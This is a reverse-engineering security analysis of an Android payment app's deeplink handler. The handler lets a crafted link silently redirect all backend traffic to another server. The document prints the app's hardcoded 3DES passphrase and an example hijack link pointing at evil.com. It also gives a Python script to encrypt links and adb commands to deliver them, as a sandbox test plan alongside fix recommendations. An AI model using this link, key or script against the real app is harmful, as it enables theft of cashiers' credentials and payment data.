# Business Logic — Deeplink Handler

> **File:** `06_business_logic/02_deeplink_handler.md`
> **Source:** `LoginActivity.java` lines 143–163, `MediaSessionCompat.r()` lines 619–631, `MediaSessionCompat.s()` lines 633–644, `AndroidManifest.xml`
> **Scope:** The `https://ecas.web.link/?ip=…` deeplink that **hot-switches the backend server** at runtime.
> **Severity:** 🔴 **CRITICAL SECURITY ISSUE** — anyone with the hardcoded DESede key can hijack the app to point at a malicious server.

---

## 1. Purpose & Business Intent

AbbasiyCashiers ships with a hardcoded fallback server URL (`https://abbasiy.yedns.org:8057/payment`), but the operator (Abbasiy Electrical Co.) clearly wanted the **ability to migrate the backend without releasing a new APK**. The mechanism chosen is an Android **App Link / Deeplink**:

```
https://ecas.web.link/?ip=<DESede-encrypted-and-Base64-encoded-server-URL>
```

When a cashier taps such a link (sent via WhatsApp/SMS by the IT admin), the app:
1. Decodes the `ip` query parameter using a **hardcoded DESede (3DES) key**.
2. Validates that the result is a valid URL (or prepends `https://`).
3. **Overwrites `APP_SERVER_IP_KEY` in SharedPreferences**, clears `APP_SERVER_CER_KEY` (cached certificate).
4. Shows "تمت العملية بنجاح" (Operation succeeded) toast.
5. From this point on, **all API traffic** goes to the new server.

---

## 2. AndroidManifest Intent Filter

```xml
<activity android:name="com.egy.webpaymentapp.Screens.LoginActivity"
          android:exported="true"
          android:launchMode="singleTop">
  <intent-filter>
    <action android:name="android.intent.action.MAIN"/>
    <category android:name="android.intent.category.LAUNCHER"/>
  </intent-filter>
  <intent-filter android:autoVerify="false">
    <action android:name="android.intent.action.VIEW"/>
    <category android:name="android.intent.category.DEFAULT"/>
    <category android:name="android.intent.category.BROWSABLE"/>
    <data android:scheme="https" android:host="ecas.web.link"/>
  </intent-filter>
</activity>
```

> 🔎 **`autoVerify="false"`** means Android does **NOT** check the `assetlinks.json` on `ecas.web.link` — any app can claim this URL, and Android shows a chooser. This is consistent with the app being internal/B2B.

---

## 3. Source Code (LoginActivity.java lines 143–163)

```java
if (getIntent() != null && getIntent().getData() != null) {
    try {
        // (1) Read ?ip= query param
        // (2) Decrypt with DESede (r = decrypt)
        // (3) The s(…) call is BOGUS — see §5 below
        String r = MediaSessionCompat.r(
                       MediaSessionCompat.s(
                           getIntent().getData().getQueryParameters("ip").get(0)
                       )
                   );

        if (!TextUtils.isEmpty(r)) {
            if (!r.startsWith("http") && !r.startsWith("https")) {
                d2 = c.b.a.c.d(this);          // open SharedPrefs
                r  = "https://" + r;           // force HTTPS
                d2.a("APP_SERVER_CER_KEY", "");
                d2.a("APP_SERVER_IP_KEY", r);
                Toast.makeText(this, "تمت العملية بنجاح", 1).show();
            }
            // ⚠️ FALL-THROUGH BUG: this block also runs in the "if" branch above
            //    because there is no `else` — see §6.
            d2 = c.b.a.c.d(this);
            d2.a("APP_SERVER_CER_KEY", "");
            d2.a("APP_SERVER_IP_KEY", r);
            Toast.makeText(this, "تمت العملية بنجاح", 1).show();
        }
    } catch (Exception e2) {
        e2.printStackTrace();
        Toast.makeText(this, e2.getLocalizedMessage(), 1).show();
    }
}
// Refresh the in-memory base URL used by Volley
if (!TextUtils.isEmpty(c.b.a.c.d(this).g("APP_SERVER_IP_KEY"))) {
    c.b.a.f.c.f1899b = c.b.a.c.d(this).g("APP_SERVER_IP_KEY");
}
```

---

## 4. The Crypto Primitives — `r()` and `s()`

### 4.1 `MediaSessionCompat.r(String str)` — DECRYPT
*(File `android/support/v4/media/session/MediaSessionCompat.java`, lines 619–631)*

```java
public static String r(String str) {
    byte[] decode = Base64.decode(str.getBytes("utf-8"), 0);
    byte[] copyOf = Arrays.copyOf(
        MessageDigest.getInstance("md5")
                     .digest("m#Y@C%P*e&B*H(#Z^)a_X-r*X*&##".getBytes("utf-8")),
        24);
    int i = 16;
    for (int i2 = 0; i2 < 8; i2++) {
        copyOf[i] = copyOf[i2];
        i++;
    }
    SecretKey k = SecretKeyFactory.getInstance("DESede")
                                  .generateSecret(new DESedeKeySpec(copyOf));
    Cipher c = Cipher.getInstance("DESede");
    c.init(Cipher.DECRYPT_MODE, k);
    return new String(c.doFinal(decode), "UTF-8");
}
```

### 4.2 `MediaSessionCompat.s(String str)` — ENCRYPT
*(Lines 633–644)*

```java
public static String s(String str) {
    byte[] copyOf = Arrays.copyOf(
        MessageDigest.getInstance("md5")
                     .digest("m#Y@C%P*e&B*H(#Z^)a_X-r*X*&##".getBytes("utf-8")),
        24);
    int i = 16;
    for (int i2 = 0; i2 < 8; i2++) {
        copyOf[i] = copyOf[i2];
        i++;
    }
    SecretKey k = SecretKeyFactory.getInstance("DESede")
                                  .generateSecret(new DESedeKeySpec(copyOf));
    Cipher c = Cipher.getInstance("DESede");
    c.init(Cipher.ENCRYPT_MODE, k);
    return Base64.encodeToString(c.doFinal(str.getBytes("utf-8")), Base64.DEFAULT);
}
```

### 4.3 Key Derivation (identical in both)

| Step | Operation                                                | Output Length |
|------|----------------------------------------------------------|---------------|
| 1    | `passphrase = "m#Y@C%P*e&B*H(#Z^)a_X-r*X*&##"` (28 chars) | 28 bytes      |
| 2    | `md5(passphrase)`                                        | 16 bytes      |
| 3    | `Arrays.copyOf(md5, 24)` (pad with 8 zeros)              | 24 bytes      |
| 4    | **Overwrite bytes [16..23] with bytes [0..7]**           | 24 bytes      |

Resulting DESede key layout:
```
[ K1 (8B = md5[0..7]) | K2 (8B = md5[8..15]) | K3 (8B = md5[0..7] again) ]
                                                  ↑
                                   This makes it a "Two-Key 3DES"
                                   (K1 == K3) — security ~= 112 bits
```

> 💡 The author probably copy-pasted a Java snippet from StackOverflow without understanding it.
> The "copyOf(24) + manual byte-loop" pattern is the classic way to derive a **2-key 3DES** key from a 16-byte source (MD5). It's the same crypto in **mode CBC/ECB ambiguous** — see §4.4.

### 4.4 ⚠️ Cipher Mode — UNSPECIFIED ⇒ Defaults to **DESede/ECB/PKCS5Padding**

`Cipher.getInstance("DESede")` (no transformation suffix) is a **JCE provider-dependent default**. On Android (BouncyCastle), the default is:

```
DESede/ECB/PKCS5Padding
```

**ECB mode** means:
- No IV → deterministic ciphertext (same plaintext → same ciphertext always).
- No integrity (any block can be swapped/replayed).
- This is **only acceptable for a single block** of plaintext, never for a URL.

For a URL like `https://newserver.example.com:8443/payment` (~45 bytes), ECB will produce ~6 blocks, each independently encrypted — a classic textbook-bad use of DES/3DES.

---

## 5. The "Identity Transformation" Puzzle: `r(s(x)) == x`

Look at line 145 again:

```java
String r = MediaSessionCompat.r( MediaSessionCompat.s( ip ) );
```

Since `r` is decrypt and `s` is encrypt with **the same key**, the call chain is:

```
ip ──[ s ]──> encrypt(ip) ──[ r ]──> decrypt(encrypt(ip)) ──> ip
```

So **`r(s(ip))` is mathematically identical to `ip`**. The deeplink parameter is **passed through unchanged**!

### 5.1 Three Hypotheses

| # | Hypothesis                              | Likelihood | Notes                                                                                                                                                                                |
|---|-----------------------------------------|------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| 1 | **Developer error / refactor leftover** | 🟢 High    | Original code was probably just `r(ip)` (decrypt the ciphertext from the URL). Someone "wrapped it in `s(…)` to test encryption" and forgot to remove.                              |
| 2 | **Anti-RE obfuscation**                 | 🟡 Medium  | Hides the fact that `?ip=` is plaintext. A reverse engineer might write a tool to encrypt their malicious URL with `s()` first — but the link still accepts plaintext directly.       |
| 3 | **Bug = the link only accepts plaintext** | 🟢 High  | This means the IT admin generates `https://ecas.web.link/?ip=<plain-URL>`. We have **no evidence** the team ever produced an encrypted link.                                          |
| 4 | **Intentional double-cipher**           | 🔴 Low     | If true, the legit URL would be `Base64(plaintext)` — but Base64 of `https://…` decoded as DESede ciphertext would throw `BadPaddingException` in `r()`.                              |

**Empirical test (recommended):**
- Send a link `https://ecas.web.link/?ip=https%3A%2F%2Fevil.com%2Fpayment` to the app.
- If the toast says "تمت العملية بنجاح" and `APP_SERVER_IP_KEY` becomes `https://evil.com/payment`, hypothesis #1/#3 is confirmed.

---

## 6. The Fall-Through Bug (Lines 147–157)

```java
if (!r.startsWith("http") && !r.startsWith("https")) {
    d2 = c.b.a.c.d(this);
    r  = "https://" + r;
    d2.a("APP_SERVER_CER_KEY", "");
    d2.a("APP_SERVER_IP_KEY", r);
    Toast.makeText(this, "تمت العملية بنجاح", 1).show();
}
// ⚠️ NO `else` — the block below ALWAYS runs after the `if`
d2 = c.b.a.c.d(this);
d2.a("APP_SERVER_CER_KEY", "");
d2.a("APP_SERVER_IP_KEY", r);
Toast.makeText(this, "تمت العملية بنجاح", 1).show();
```

**Effect:** When the deeplink value is *not* prefixed with `http`, the code:
1. First prepends `https://` and saves.
2. **Then saves again** (redundant, same value).
3. **Shows the toast TWICE.**

This is a benign bug (no security impact), but it confirms the code is poorly reviewed.

---

## 7. SharedPreferences Touched

| Key                  | Old Value (default)                                        | New Value (after deeplink)               | Purpose                                                              |
|----------------------|------------------------------------------------------------|------------------------------------------|----------------------------------------------------------------------|
| `APP_SERVER_IP_KEY`  | `https://abbasiy.yedns.org:8057/payment` (hardcoded default) | the deeplink-supplied URL                | Base URL for all Volley requests in `c.b.a.f.c.f1899b`.              |
| `APP_SERVER_CER_KEY` | (potentially cached server cert)                           | `""` (empty)                             | Forces TLS to use the empty `X509TrustManager` (`d.java`) fresh.     |

> 🔎 Clearing `APP_SERVER_CER_KEY` is consistent with the goal of **switching server identity** — old pinned cert (if any) is invalid against new host.

---

## 8. Sequence Diagram

```
User                   Android OS         LoginActivity     MediaSessionCompat   SharedPreferences   Volley
 │                          │                   │                   │                  │              │
 │  click WhatsApp link     │                   │                   │                  │              │
 │ ───────────────────────▶ │                   │                   │                  │              │
 │                          │  Intent (VIEW,    │                   │                  │              │
 │                          │  data=https://    │                   │                  │              │
 │                          │  ecas.web.link/   │                   │                  │              │
 │                          │  ?ip=…)           │                   │                  │              │
 │                          │ ────────────────▶ │                   │                  │              │
 │                          │                   │ onCreate(intent)  │                  │              │
 │                          │                   │ ────────────┐     │                  │              │
 │                          │                   │             │     │                  │              │
 │                          │                   │ data.getQueryParameters("ip")        │              │
 │                          │                   │ ────────────┘     │                  │              │
 │                          │                   │  s(ip) → ct       │                  │              │
 │                          │                   │ ─────────────────▶│                  │              │
 │                          │                   │  r(ct) → ip       │                  │              │
 │                          │                   │ ─────────────────▶│                  │              │
 │                          │                   │                   │                  │              │
 │                          │                   │  prepend https://  if needed         │              │
 │                          │                   │  put("APP_SERVER_CER_KEY","")        │              │
 │                          │                   │ ───────────────────────────────────▶ │              │
 │                          │                   │  put("APP_SERVER_IP_KEY", r)         │              │
 │                          │                   │ ───────────────────────────────────▶ │              │
 │                          │                   │  Toast: "تمت العملية بنجاح"          │              │
 │                          │                   │                   │                  │              │
 │                          │                   │  c.f1899b = r     │                  │              │
 │                          │                   │ ─────────────────────────────────────────────────▶ │
 │                          │                   │                   │                  │              │
 │                          │                   │  ── normal login UI continues ──     │              │
```

---

## 9. Security Risks (CVE-class)

| #  | Risk                                                            | Severity | Attack Scenario                                                                                                                                                                                                                                                                                            |
|----|-----------------------------------------------------------------|---------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| R1 | **Server-hijack via crafted link**                              | 🔴 CRITICAL | An attacker who knows the hardcoded DESede key (or just plaintext, per §5) sends `https://ecas.web.link/?ip=https%3A%2F%2Fevil.com%2Fpayment`. App now POSTs **credentials, customer data, payments** to attacker's server. There is no warning beyond a Toast in Arabic.                                |
| R2 | **TLS bypass amplifies R1**                                     | 🔴 CRITICAL | Empty `X509TrustManager` (`c.b.a.f.d`) means any HTTPS cert is accepted — attacker doesn't even need to compromise CA. Self-signed cert on `evil.com` works.                                                                                                                                              |
| R3 | **Hardcoded key in APK**                                        | 🔴 CRITICAL | The DESede key `m#Y@C%P*e&B*H(#Z^)a_X-r*X*&##` is in plaintext inside `classes.dex`. Anyone with the APK can extract it in seconds (we did).                                                                                                                                                              |
| R4 | **No URL whitelist / allow-list**                               | 🟠 HIGH     | The app accepts ANY URL, including `http://` (which gets force-upgraded to `https://`). It could reject anything outside `*.abbasiy.*` or `*.yedns.org` but doesn't.                                                                                                                                       |
| R5 | **No user confirmation prompt**                                 | 🟠 HIGH     | Cashier sees only "تمت العملية بنجاح" (Operation successful) — no "Do you want to change the server to X?". Phishing scenario: IT-impostor messages a cashier "Click here to update server".                                                                                                              |
| R6 | **ECB mode (textbook insecure)**                                | 🟡 MED   | If the encryption were actually used (it isn't, per §5), ECB would leak structure: identical 8-byte blocks (e.g. repeated `://abbasi`) produce identical ciphertext blocks.                                                                                                                                |
| R7 | **2-Key 3DES (~112-bit security)**                              | 🟡 MED   | NIST deprecated 3DES for new applications in 2017 (SP 800-131A). Even though 112 bits is currently safe, future quantum attacks (Grover's) cut it to ~56 bits.                                                                                                                                              |
| R8 | **`autoVerify=false`**                                          | 🟡 MED   | Any malicious app can declare an intent-filter for `ecas.web.link` and intercept the link → MITM at the OS level. With `autoVerify=true`, Google's `assetlinks.json` would prevent this — but the JSON is not hosted.                                                                                       |
| R9 | **Exception leaks via `e2.getLocalizedMessage()` Toast**         | 🟢 LOW   | Padding errors or crypto errors are shown in plaintext to the user, potentially revealing stack-trace-like info.                                                                                                                                                                                            |
| R10| **`APP_SERVER_CER_KEY` cleared but never re-validated**         | 🟡 MED   | After clearing, the next request goes through `c.b.a.f.d` (empty trust manager) — there's no pinning to the new host.                                                                                                                                                                                       |

---

## 10. Reproduction (Sandbox Test Plan)

> ⚠️ Run this only on a test device with a test backend.

### 10.1 Generate a valid link (assuming hypothesis #1 — plaintext)
```bash
python3 - <<'EOF'
import urllib.parse
url = "https://my-test-server.example.com:8443/payment"
print(f"https://ecas.web.link/?ip={urllib.parse.quote(url, safe='')}")
EOF
# → https://ecas.web.link/?ip=https%3A//my-test-server.example.com%3A8443/payment
```

### 10.2 Generate a "properly encrypted" link (per the dead encryption path)
```python
# python3
from Crypto.Cipher import DES3
from hashlib import md5
import base64

passphrase = b"m#Y@C%P*e&B*H(#Z^)a_X-r*X*&##"
k = bytearray(md5(passphrase).digest())  # 16 bytes
k += b"\x00" * 8                          # pad to 24
for i in range(8):
    k[16 + i] = k[i]                      # overwrite K3 = K1

cipher = DES3.new(bytes(k), DES3.MODE_ECB)
plaintext = b"https://my-test-server.example.com:8443/payment"
# PKCS5 padding
pad = 8 - len(plaintext) % 8
plaintext += bytes([pad]) * pad
ct = cipher.encrypt(plaintext)
print(base64.b64encode(ct).decode())
```

### 10.3 Send via ADB
```bash
adb shell am start \
  -a android.intent.action.VIEW \
  -d "https://ecas.web.link/?ip=<URL-or-base64>" \
  com.egy.webpaymentapp
```

### 10.4 Verify
```bash
adb shell run-as com.egy.webpaymentapp \
  cat shared_prefs/USER_DETAILS_PREF.xml | grep APP_SERVER_IP_KEY
```

---

## 11. Rebuild Recommendations (for the new app)

| Issue                              | Recommended Fix                                                                                                                                                                                                       |
|------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| Hardcoded crypto key               | Remove entirely. Use **signed JWTs** issued by the auth server, or **App Configuration via Firebase Remote Config / Backend-driven config**.                                                                          |
| ECB + 3DES                         | If you absolutely need symmetric encryption, use **AES-256-GCM** with a unique IV per message. But better: don't.                                                                                                      |
| No URL whitelist                   | Hard-code allow-list of valid backend hosts: `["abbasiy.yedns.org", "abbasiy-backup.example.com"]`. Reject everything else.                                                                                            |
| No user confirmation               | Show a modal dialog: "هل تريد تغيير الخادم إلى `{new_host}`؟ (نعم/لا)". Require admin password (PIN) for production builds.                                                                                            |
| TLS bypass                         | Use **OkHttp + Certificate Pinning** with rotation support. Pin against the leaf + intermediate.                                                                                                                       |
| App Link autoVerify=false          | Host `https://ecas.web.link/.well-known/assetlinks.json` and set `autoVerify=true`. Prevents impostor apps from intercepting.                                                                                          |
| Identity transformation `r(s(x))`  | **Delete one of them.** Either:  • Plaintext: `String ip = intent.getData().getQueryParameter("ip")` and remove crypto.  • Encrypted: `String ip = decrypt(intent.getData().getQueryParameter("ip"))`.                |
| Fall-through double-save bug       | Add `else` branch. Or refactor to one save call.                                                                                                                                                                       |

---

## 12. Migration Code Snippet (React Native, recommended)

```ts
// src/services/deeplink.ts
import { Linking } from 'react-native';
import { ConfigStore } from './config-store';
import { showConfirm } from '../ui/dialogs';

const ALLOWED_HOSTS = ['abbasiy.yedns.org', 'abbasiy-backup.example.com'];

export function initDeeplinks() {
  Linking.addEventListener('url', async ({ url }) => {
    const u = new URL(url);
    if (u.host !== 'ecas.web.link') return;

    const ip = u.searchParams.get('ip');
    if (!ip) return;

    let target: URL;
    try {
      target = new URL(ip.startsWith('http') ? ip : `https://${ip}`);
    } catch {
      return showError('رابط غير صالح');
    }

    if (!ALLOWED_HOSTS.includes(target.host)) {
      return showError(`الخادم ${target.host} غير معتمد`);
    }

    const confirmed = await showConfirm(
      `هل تريد تغيير الخادم إلى ${target.host}؟`,
    );
    if (!confirmed) return;

    await ConfigStore.set('APP_SERVER_IP', target.toString());
    await ConfigStore.delete('APP_SERVER_CER'); // force re-pin
    showSuccess('تم تغيير الخادم بنجاح');
  });
}
```

---

## 13. Cross-References

- 📄 `04_screens_flow/01_login_screen.md` — Where the deeplink handler lives.
- 📄 `07_crypto_protocols/02_desede_deeplink.md` — Deeper crypto math + test vectors.
- 📄 `01_overview/02_architecture_diagram.md` — Shows the deeplink as the "Server Switch" entry point.
- 📄 `10_rebuild_blueprint/05_security_improvements.md` — Will reiterate these mitigations in the rebuild plan.

---

## 14. Summary Verdict

| Property            | Verdict                                                                                          |
|---------------------|--------------------------------------------------------------------------------------------------|
| Purpose             | ✅ Legitimate B2B need (server migration without APK release).                                   |
| Implementation      | ❌ Catastrophically insecure (hardcoded key, plaintext after `r(s(x))`, no whitelist, TLS bypass).|
| Net effect          | 🔴 **App can be remotely hijacked by anyone who possesses the APK or DESede key.**               |
| Rebuild priority    | 🔴 **MUST BE REPLACED** with a JWT-signed config endpoint and host whitelist.                    |

---

> *End of `06_business_logic/02_deeplink_handler.md`*
